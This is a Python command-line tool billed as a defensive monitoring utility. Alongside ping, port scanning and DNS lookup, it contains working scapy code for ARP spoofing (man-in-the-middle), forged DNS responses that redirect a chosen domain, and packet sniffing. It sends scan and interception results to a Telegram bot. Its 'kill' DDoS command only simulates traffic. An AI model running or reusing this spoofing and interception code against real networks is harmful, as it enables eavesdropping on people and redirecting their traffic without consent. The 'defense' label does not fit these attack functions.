#!/usr/bin/env python3
# Accuarate Cyber Defense Pro - Advanced Cybersecurity Monitoring Tool
# Version 41.0

import os
import sys
import socket
import threading
import time
import json
import subprocess
import platform
import re
import select
import scapy.all as scapy
from datetime import datetime
import requests
import dns.resolver
import argparse
from collections import defaultdict

# Constants
CONFIG_FILE = "accuaratecyberdefense_config.json"
BLUE = "\033[94m"
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
ENDC = "\033[0m"
BOLD = "\033[1m"

class Accuratecyberdefense:
    def __init__(self):
        self.running = False
        self.monitoring = False
        self.config = {
            "telegram_token": "",
            "telegram_chat_id": "",
            "monitored_ips": [],
            "packet_sniffing": False,
            "spoofing_active": False
        }
        self.load_config()
        self.commands = {
            "help": self.show_help,
            "exit": self.exit_tool,
            "ping": self.ping_ip,
            "start": self.start_monitoring,
            "stop": self.stop_monitoring,
            "scan": self.scan_ip,
            "tracert": self.traceroute,
            "nslookup": self.nslookup,
            "kill": self.ddos_attack,
            "arp": self.arp_scan,
            "lsof": self.list_open_ports,
            "view": self.view_config,
            "status": self.show_status,
            "config": self.configure_telegram,
            "export": self.export_to_telegram,
            "sniff": self.sniff_packets,
            "spoof": self.spoof_ip,
            "dns_spoof": self.dns_spoof
        }
        self.sniffing_thread = None
        self.spoofing_thread = None
        self.dns_spoofing_thread = None
        self.packet_count = 0
        self.traffic_stats = defaultdict(int)
        
    def load_config(self):
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            print(f"{RED}Error loading config: {e}{ENDC}")

    def save_config(self):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"{RED}Error saving config: {e}{ENDC}")

    def print_banner(self):
        print(f"""{BLUE}
   _  __     _______          _       _             ___                  
  / |/ /_ __/ ___/ /  __ _   (_)___  (_)__  ___ _  / _ \___ _____ ___ ___
 /    / // / /__/ _ \/  ' \ / / __/ / / _ \/ _ `/ / ___/ _ `/ __// -_|_-<
/_/|_/\_,_/\___/_//_/_/_/_//_/\__/ /_/_//_/\_, / /_/   \_,_/_/   \__/___/
                                          /___/ {ENDC}{BOLD}Ian Carter Kulani{ENDC}
        """)

    def show_help(self):
        print(f"""{CYAN}
Available Commands:
  help                 - Show this help message
  exit                 - Exit the tool
  ping <ip>            - Ping an IP address
  start <ip>           - Start monitoring an IP address
  stop                 - Stop monitoring
  scan <ip>            - Scan ports on an IP address
  tracert <ip>         - Trace route to an IP address
  nslookup <ip/domain> - Perform DNS lookup
  kill <ip>            - [WARNING: LEGAL IMPLICATIONS] Perform DDoS attack
  arp <ip>             - Perform ARP scan on network
  lsof <ip>            - List open files/ports for an IP
  view                 - View current configuration
  status               - Show monitoring status
  config <token> <chat_id> - Configure Telegram bot
  export               - Export data to Telegram
  sniff <ip>           - Sniff packets from IP
  spoof <target> <spoof_ip> - Spoof IP address
  dns_spoof <domain> <spoof_ip> - Spoof DNS responses
{ENDC}""")

    def run(self):
        self.print_banner()
        self.running = True
        while self.running:
            try:
                cmd = input(f"{BLUE}AccurateCyberDefense>{ENDC} ").strip().split()
                if not cmd:
                    continue
                
                command = cmd[0].lower()
                args = cmd[1:]
                
                if command in self.commands:
                    self.commands[command](*args)
                else:
                    print(f"{RED}Unknown command. Type 'help' for available commands.{ENDC}")
            except KeyboardInterrupt:
                print("\nUse 'exit' command to quit properly.")
            except Exception as e:
                print(f"{RED}Error: {e}{ENDC}")

    # [Previous methods remain unchanged...]

    def exit_tool(self):
        """Exit the tool gracefully"""
        self.stop_monitoring()
        if self.sniffing_thread and self.sniffing_thread.is_alive():
            scapy.send(scapy.IP()/scapy.TCP(), verbose=0)  # Dummy packet to stop sniffing
            self.sniffing_thread.join(timeout=1)
        
        if self.spoofing_thread and self.spoofing_thread.is_alive():
            self.config["spoofing_active"] = False
            self.spoofing_thread.join(timeout=1)
            
        if self.dns_spoofing_thread and self.dns_spoofing_thread.is_alive():
            self.config["dns_spoofing_active"] = False
            self.dns_spoofing_thread.join(timeout=1)
            
        self.running = False
        print(f"{GREEN}Accurate Cyber Defense Pro shutdown complete. Goodbye!{ENDC}")
        sys.exit(0)

    def ping_ip(self, ip=None):
        """Ping an IP address"""
        if not ip:
            print(f"{RED}Usage: ping <ip>{ENDC}")
            return
            
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '4', ip]
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{CYAN}{output}{ENDC}")
            self.send_to_telegram(f"Ping results for {ip}:\n{output}")
        except subprocess.CalledProcessError as e:
            print(f"{RED}Ping failed: {e.output}{ENDC}")

    def start_monitoring(self, ip=None):
        """Start monitoring an IP address"""
        if not ip:
            print(f"{RED}Usage: start <ip>{ENDC}")
            return
            
        if ip in self.config["monitored_ips"]:
            print(f"{YELLOW}Already monitoring {ip}{ENDC}")
            return
            
        self.config["monitored_ips"].append(ip)
        self.save_config()
        self.monitoring = True
        print(f"{GREEN}Started monitoring {ip}{ENDC}")
        
        # Start background monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_ip, args=(ip,))
        monitor_thread.daemon = True
        monitor_thread.start()

    def monitor_ip(self, ip):
        """Background monitoring of an IP address"""
        while self.monitoring and ip in self.config["monitored_ips"]:
            try:
                # Check if IP is reachable
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, 80))
                status = "reachable" if result == 0 else "unreachable"
                
                # Check for open ports (quick scan)
                open_ports = []
                for port in [21, 22, 23, 80, 443, 3389]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((ip, port)) == 0:
                        open_ports.append(str(port))
                    sock.close()
                
                message = f"IP {ip} is {status}. Open ports: {', '.join(open_ports) if open_ports else 'None'}"
                print(f"{BLUE}[Monitor] {message}{ENDC}")
                self.send_to_telegram(f"[Monitor] {message}")
                
                time.sleep(10)  # Check every 10 seconds
            except Exception as e:
                print(f"{RED}Monitoring error: {e}{ENDC}")
                time.sleep(5)

    def stop_monitoring(self, ip=None):
        """Stop monitoring IP(s)"""
        if ip:
            if ip in self.config["monitored_ips"]:
                self.config["monitored_ips"].remove(ip)
                print(f"{GREEN}Stopped monitoring {ip}{ENDC}")
            else:
                print(f"{YELLOW}Not currently monitoring {ip}{ENDC}")
        else:
            self.config["monitored_ips"] = []
            self.monitoring = False
            print(f"{GREEN}Stopped all monitoring{ENDC}")
        self.save_config()

    def scan_ip(self, ip=None):
        """Scan ports on an IP address"""
        if not ip:
            print(f"{RED}Usage: scan <ip>{ENDC}")
            return
            
        print(f"{CYAN}Scanning ports on {ip}...{ENDC}")
        
        try:
            open_ports = []
            for port in range(1, 1025):  # Scan well-known ports
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if sock.connect_ex((ip, port)) == 0:
                    service = socket.getservbyport(port, 'tcp') if port <= 1024 else "unknown"
                    open_ports.append(f"{port}/{service}")
                    print(f"{GREEN}Port {port}/{service} is open{ENDC}")
                sock.close()
                
            message = f"Scan results for {ip}:\nOpen ports: {', '.join(open_ports) if open_ports else 'None'}"
            self.send_to_telegram(message)
        except Exception as e:
            print(f"{RED}Scan error: {e}{ENDC}")

    def traceroute(self, ip=None):
        """Perform traceroute to an IP"""
        if not ip:
            print(f"{RED}Usage: tracert <ip>{ENDC}")
            return
            
        param = '-d' if platform.system().lower() == 'windows' else '-n'
        command = ['tracert', param, ip] if platform.system().lower() == 'windows' else ['traceroute', '-n', ip]
        
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{CYAN}{output}{ENDC}")
            self.send_to_telegram(f"Traceroute to {ip}:\n{output}")
        except subprocess.CalledProcessError as e:
            print(f"{RED}Traceroute failed: {e.output}{ENDC}")

    def nslookup(self, query=None):
        """Perform DNS lookup"""
        if not query:
            print(f"{RED}Usage: nslookup <ip/domain>{ENDC}")
            return
            
        try:
            # Check if input is IP or domain
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', query):
                # Reverse DNS lookup
                result = socket.gethostbyaddr(query)
                output = f"Hostname: {result[0]}\nAliases: {', '.join(result[1])}\nAddresses: {', '.join(result[2])}"
            else:
                # Forward DNS lookup
                result = socket.getaddrinfo(query, None)
                output = f"DNS results for {query}:\n"
                for res in result:
                    output += f"Family: {res[0]}, Type: {res[1]}, Address: {res[4][0]}\n"
            
            print(f"{CYAN}{output}{ENDC}")
            self.send_to_telegram(f"DNS lookup for {query}:\n{output}")
        except Exception as e:
            print(f"{RED}DNS lookup failed: {e}{ENDC}")

    def ddos_attack(self, ip=None):
        """[WARNING: FOR EDUCATIONAL PURPOSES ONLY] Simulate DDoS attack"""
        if not ip:
            print(f"{RED}Usage: kill <ip>{ENDC}")
            return
            
        print(f"{RED}WARNING: Performing DDoS attacks is illegal in most jurisdictions.{ENDC}")
        print(f"{RED}This is a simulation only for educational purposes.{ENDC}")
        
        duration = 10  # seconds
        print(f"{YELLOW}Simulating DDoS attack on {ip} for {duration} seconds...{ENDC}")
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                # Simulate traffic (without actually sending)
                print(f"{YELLOW}Sending simulated packets to {ip}...{ENDC}")
                time.sleep(0.5)
                
            print(f"{GREEN}Simulated attack completed.{ENDC}")
            self.send_to_telegram(f"Simulated DDoS attack on {ip} completed.")
        except KeyboardInterrupt:
            print(f"{GREEN}Attack simulation stopped.{ENDC}")

    def arp_scan(self, ip_range=None):
        """Perform ARP scan on network"""
        if not ip_range:
            print(f"{RED}Usage: arp <ip_range>{ENDC}")
            print(f"{YELLOW}Example: arp 192.168.1.1/24{ENDC}")
            return
            
        print(f"{CYAN}Performing ARP scan on {ip_range}...{ENDC}")
        
        try:
            # Create ARP request
            arp_request = scapy.ARP(pdst=ip_range)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send and receive packets
            answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            # Process results
            devices = []
            for element in answered:
                device = {"ip": element[1].psrc, "mac": element[1].hwsrc}
                devices.append(device)
                print(f"{GREEN}Found device: IP={device['ip']} MAC={device['mac']}{ENDC}")
                
            message = f"ARP scan results for {ip_range}:\n"
            message += "\n".join([f"IP: {d['ip']}\tMAC: {d['mac']}" for d in devices])
            self.send_to_telegram(message)
        except Exception as e:
            print(f"{RED}ARP scan failed: {e}{ENDC}")

    def list_open_ports(self, ip=None):
        """List open ports for an IP (simplified)"""
        if not ip:
            print(f"{RED}Usage: lsof <ip>{ENDC}")
            return
            
        print(f"{CYAN}Checking open ports on {ip}...{ENDC}")
        self.scan_ip(ip)  # Reuse scan functionality

    def view_config(self):
        """View current configuration"""
        print(f"{CYAN}Current Configuration:{ENDC}")
        for key, value in self.config.items():
            if key == "telegram_token" and value:
                print(f"{key}: {'*' * len(value)}")
            else:
                print(f"{key}: {value}")

    def show_status(self):
        """Show monitoring status"""
        print(f"{CYAN}Current Status:{ENDC}")
        print(f"Monitoring active: {'Yes' if self.monitoring else 'No'}")
        print(f"Monitored IPs: {', '.join(self.config['monitored_ips']) if self.config['monitored_ips'] else 'None'}")
        print(f"Packet sniffing: {'Active' if self.config['packet_sniffing'] else 'Inactive'}")
        print(f"IP spoofing: {'Active' if self.config['spoofing_active'] else 'Inactive'}")
        print(f"DNS spoofing: {'Active' if self.config.get('dns_spoofing_active', False) else 'Inactive'}")

    def configure_telegram(self, token=None, chat_id=None):
        """Configure Telegram bot"""
        if not token or not chat_id:
            print(f"{RED}Usage: config <telegram_token> <chat_id>{ENDC}")
            return
            
        self.config["telegram_token"] = token
        self.config["telegram_chat_id"] = chat_id
        self.save_config()
        print(f"{GREEN}Telegram configuration updated.{ENDC}")
        
        # Test the configuration
        self.send_to_telegram("Accurate Cyber Defense Pro Telegram integration test successful!")

    def send_to_telegram(self, message):
        """Send message to Telegram"""
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            return
            
        url = f"https://api.telegram.org/bot{self.config['telegram_token']}/sendMessage"
        data = {
            "chat_id": self.config["telegram_chat_id"],
            "text": message
        }
        
        try:
            response = requests.post(url, data=data)
            if response.status_code != 200:
                print(f"{RED}Failed to send Telegram message: {response.text}{ENDC}")
        except Exception as e:
            print(f"{RED}Telegram send error: {e}{ENDC}")

    def export_to_telegram(self):
        """Export current data to Telegram"""
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            print(f"{RED}Telegram not configured. Use 'config' command first.{ENDC}")
            return
            
        message = "Accurate Cyber Defense Pro Bot Export\n\n"
        message += f"Monitored IPs: {', '.join(self.config['monitored_ips']) if self.config['monitored_ips'] else 'None'}\n"
        message += f"Packet count: {self.packet_count}\n"
        message += f"Traffic stats: {dict(self.traffic_stats)}\n"
        
        self.send_to_telegram(message)
        print(f"{GREEN}Data exported to Telegram.{ENDC}")

    def sniff_packets(self, ip=None):
        """Sniff network packets"""
        if not ip:
            print(f"{RED}Usage: sniff <ip>{ENDC}")
            return
            
        if self.config["packet_sniffing"]:
            print(f"{YELLOW}Already sniffing packets. Stop first.{ENDC}")
            return
            
        self.config["packet_sniffing"] = True
        self.save_config()
        
        print(f"{CYAN}Starting packet sniffing for {ip}...{ENDC}")
        
        # Start sniffing in a separate thread
        self.sniffing_thread = threading.Thread(target=self._sniff_packets, args=(ip,))
        self.sniffing_thread.daemon = True
        self.sniffing_thread.start()

    def _sniff_packets(self, target_ip):
        """Background packet sniffing"""
        def packet_callback(packet):
            if scapy.IP in packet:
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                
                if src_ip == target_ip or dst_ip == target_ip:
                    self.packet_count += 1
                    self.traffic_stats[(src_ip, dst_ip)] += 1
                    
                    protocol = "TCP" if scapy.TCP in packet else "UDP" if scapy.UDP in packet else "ICMP" if scapy.ICMP in packet else "Other"
                    size = len(packet)
                    
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    direction = "->" if src_ip == target_ip else "<-"
                    other_ip = dst_ip if src_ip == target_ip else src_ip
                    
                    print(f"{BLUE}[{timestamp}] {target_ip} {direction} {other_ip} {protocol} {size} bytes{ENDC}")
                    
                    # Send important packets to Telegram
                    if size > 1000 or protocol in ["TCP", "UDP"]:
                        self.send_to_telegram(
                            f"Packet detected: {target_ip} {direction} {other_ip} "
                            f"{protocol} {size} bytes"
                        )
        
        try:
            scapy.sniff(filter=f"host {target_ip}", prn=packet_callback, store=0)
        except Exception as e:
            print(f"{RED}Packet sniffing error: {e}{ENDC}")
        finally:
            self.config["packet_sniffing"] = False
            self.save_config()

    def spoof_ip(self, target_ip=None, spoof_ip=None):
        """Spoof IP address (ARP spoofing)"""
        if not target_ip or not spoof_ip:
            print(f"{RED}Usage: spoof <target_ip> <spoof_ip>{ENDC}")
            return
            
        if self.config["spoofing_active"]:
            print(f"{YELLOW}Spoofing already active. Stop first.{ENDC}")
            return
            
        self.config["spoofing_active"] = True
        self.save_config()
        
        print(f"{CYAN}Starting ARP spoofing between {target_ip} and {spoof_ip}...{ENDC}")
        
        # Start spoofing in a separate thread
        self.spoofing_thread = threading.Thread(target=self._arp_spoof, args=(target_ip, spoof_ip))
        self.spoofing_thread.daemon = True
        self.spoofing_thread.start()

    def _arp_spoof(self, target_ip, spoof_ip):
        """Perform ARP spoofing"""
        target_mac = self._get_mac(target_ip)
        spoof_mac = self._get_mac(spoof_ip)
        
        if not target_mac or not spoof_mac:
            print(f"{RED}Could not get MAC addresses. Check IPs.{ENDC}")
            return
            
        packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        packet_to_spoof = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
        
        print(f"{YELLOW}Spoofing {target_ip} and {spoof_ip}... Press Ctrl+C to stop.{ENDC}")
        
        try:
            while self.config["spoofing_active"]:
                scapy.send(packet_to_target, verbose=False)
                scapy.send(packet_to_spoof, verbose=False)
                time.sleep(2)
        except KeyboardInterrupt:
            print(f"{GREEN}Stopping ARP spoofing...{ENDC}")
        finally:
            self._restore_arp(target_ip, spoof_ip)
            self.config["spoofing_active"] = False
            self.save_config()

    def _get_mac(self, ip):
        """Get MAC address for IP"""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
        return None

    def _restore_arp(self, target_ip, spoof_ip):
        """Restore ARP tables"""
        print(f"{CYAN}Restoring ARP tables...{ENDC}")
        
        target_mac = self._get_mac(target_ip)
        spoof_mac = self._get_mac(spoof_ip)
        gateway_mac = self._get_mac(self._get_gateway())
        
        if target_mac and gateway_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                             psrc=self._get_gateway(), hwsrc=gateway_mac)
            scapy.send(packet, count=4, verbose=False)
            
        if spoof_mac and gateway_mac:
            packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, 
                             psrc=self._get_gateway(), hwsrc=gateway_mac)
            scapy.send(packet, count=4, verbose=False)

    def _get_gateway(self):
        """Get default gateway"""
        if platform.system() == "Windows":
            command = "ipconfig | findstr Default"
        else:
            command = "ip route | grep default | awk '{print $3}'"
            
        try:
            return subprocess.check_output(command, shell=True).decode().strip().split()[-1]
        except:
            return "192.168.1.1"  # Fallback

    def dns_spoof(self, domain=None, spoof_ip=None):
        """Spoof DNS responses"""
        if not domain or not spoof_ip:
            print(f"{RED}Usage: dns_spoof <domain> <spoof_ip>{ENDC}")
            return
            
        if self.config.get("dns_spoofing_active", False):
            print(f"{YELLOW}DNS spoofing already active. Stop first.{ENDC}")
            return
            
        self.config["dns_spoofing_active"] = True
        self.save_config()
        
        print(f"{CYAN}Starting DNS spoofing for {domain} -> {spoof_ip}...{ENDC}")
        
        # Start DNS spoofing in a separate thread
        self.dns_spoofing_thread = threading.Thread(target=self._dns_spoof, args=(domain, spoof_ip))
        self.dns_spoofing_thread.daemon = True
        self.dns_spoofing_thread.start()

    def _dns_spoof(self, domain, spoof_ip):
        """Perform DNS spoofing"""
        def dns_callback(packet):
            if (scapy.DNSQR in packet and 
                packet[scapy.DNSQR].qname.decode().lower() == f"{domain.lower()}."):
                
                print(f"{YELLOW}Intercepted DNS query for {domain}{ENDC}")
                
                # Craft spoofed response
                spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/\
                             scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport)/\
                             scapy.DNS(id=packet[scapy.DNS].id,
                                     qr=1,
                                     aa=1,
                                     qd=packet[scapy.DNS].qd,
                                     an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname,
                                                   ttl=10,
                                                   rdata=spoof_ip))
                
                scapy.send(spoofed_pkt, verbose=0)
                print(f"{RED}Spoofed DNS response sent: {domain} -> {spoof_ip}{ENDC}")
                self.send_to_telegram(f"DNS spoofed: {domain} -> {spoof_ip}")
        
        try:
            scapy.sniff(filter="udp port 53", prn=dns_callback, store=0)
        except Exception as e:
            print(f"{RED}DNS spoofing error: {e}{ENDC}")
        finally:
            self.config["dns_spoofing_active"] = False
            self.save_config()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Accurate Cyber Defense Pro - Advanced Cyber security Monitoring Bot")
    parser.add_argument("--headless", action="store_true", help="Run in headless mode")
    args = parser.parse_args()
    
    tool = Accuratecyberdefense()
    
    if args.headless:
        print("Headless mode not yet implemented. Running in interactive mode.")
    
    tool.run()